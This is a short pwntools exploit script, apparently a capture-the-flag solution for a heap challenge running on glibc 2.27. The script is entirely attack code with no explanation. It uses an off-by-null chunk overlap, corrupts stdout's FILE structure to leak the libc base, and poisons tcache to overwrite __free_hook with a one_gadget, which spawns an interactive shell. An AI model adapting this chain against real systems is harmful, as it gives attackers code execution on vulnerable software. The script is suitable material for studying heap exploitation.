from pwn import*
from LD import*
def add(size,data):
	p.sendlineafter('Your choice: ','1')
	p.sendlineafter('Size:',str(size))
	p.sendafter('Data:',data)
def free(index):
	p.sendlineafter('Your choice: ','2')
	p.sendlineafter('Index:',str(index))
	
libc = ELF('./libc-2.27.so',checksec=False)
LD=change_ld('./main','./ld-2.27.so')
context.log_level ='debug'
p = LD.process(env={'LD_PRELOAD':'./libc-2.27.so'})
add(0x500,'\n')
add(0x68,'\n')
add(0x4F0,'\n')
add(0x20,'\n')
free(1)
free(0)
for i in range(9):
	add((0x68-i),'U'*(0x68 - i))
	free(0)
add(0x68,'U'*0x60 + p64(0x580))
free(2)
free(0)
add(0x500,'\n')
add(0x78,'\x60\x07')
add(0x68,'\n')
payload = p64(0xFBAD1800) + p64(0)*3  + '\xC8'
add(0x68,payload)
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
log.info('LIBC_BASE:\t'+hex(libc_base))
libc.address = libc_base
og = [0x4F2C5,0x4F322,0x10A38C]
one_gadget = libc_base + og[1]
free(2)
free(1)
add(0x78,p64(libc.sym['__free_hook']))
add(0x78,'\n')
add(0x78,p64(one_gadget))
free(3)
p.interactive()
